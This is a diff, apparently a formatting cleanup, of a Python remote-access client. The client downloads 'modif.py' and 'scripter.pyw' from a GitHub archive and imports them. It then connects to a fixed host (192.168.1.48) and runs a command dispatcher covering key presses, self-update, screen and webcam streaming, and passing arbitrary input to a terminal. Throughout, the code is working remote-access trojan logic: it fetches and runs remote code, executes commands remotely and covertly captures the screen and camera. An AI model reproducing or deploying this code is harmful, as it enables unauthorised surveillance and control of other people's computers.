@@ -1,20 +1,15 @@
 import socket, zipfile, os, shutil, time, subprocess, requests, pyautogui
-from vidstream import ScreenShareClient, CameraClient
-from turtle import left
+from vidstream import ScreenShareClient, CameraClient; from turtle import left
 
 url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
     
 def getpath(change=False):
-    if change in (False, "not", "\\"):
-        return os.getcwd()
-    else: return os.getcwd().replace('\\', '/')
-def getFileName():
-    return os.path.basename(__file__)
-def getNameDir(data):
-    return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
+    if change in (False, "not", "\\"):          return os.getcwd()
+    else:                                       return os.getcwd().replace('\\', '/')
+def getFileName():                              return os.path.basename(__file__)
+def getNameDir(data):                           return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
 
-def supDir(data):
-    shutil.rmtree(data)
+def supDir(data):                               shutil.rmtree(data)
     
 def downloadFileGithub(file_url, data=".zip"):
     with open(data,"wb") as zip	: 
@@ -37,21 +32,17 @@ def sortNameFile(data):
 def moveFileFromDir(data, file):
     if type(file)==str:
         file = file.split()
-    print(file)
     for f in range(len(file)):
         if file[f] != getFileName():
-            print(getpath(True)+"/"+data+"/"+file[f], getpath(True))
             shutil.copy(getpath(True)+"/"+data+"/"+file [f], getpath(True))
 
 tryit = False
 while tryit == False:
     try: 
-        import modif
-        import scripter
+        import modif, scripter
         tryit = True
     except:
-        listfile = ["modif.py", "scripter.pyw"]
-        dir = getNameDir(url)
+        listfile, dir = ["modif.py", "scripter.pyw"], getNameDir(url)
         downloadFileGithub(url)
         moveFileFromDir(dir, listfile)
         time.sleep(1)
@@ -112,12 +103,10 @@ def execute(data):
         press(data[6:len(data) - 1])
     elif data == "update":
         modif.update(url)
-        ossys = True
-        sortir = True
+        ossys, sortir = True, True
     elif data =="updelte":
         modif.update(url, delete=True)
-        ossys = True
-        sortir = True
+        ossys, sortir = True, True
     elif data == "screen":
         screen()
     elif data == "camera":
@@ -132,13 +121,9 @@ def execute(data):
     else:
         terminal(data)
 
-run = True
-ossys = False
+run, ossys = True, False
 while run == True:
-    sortir = False
-    ipScreen = "192.168.1.48"
-    port = 22228
-    
+    sortir, ipScreen, port = False, "192.168.1.48", 22228
     
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect((ipScreen, 22223))
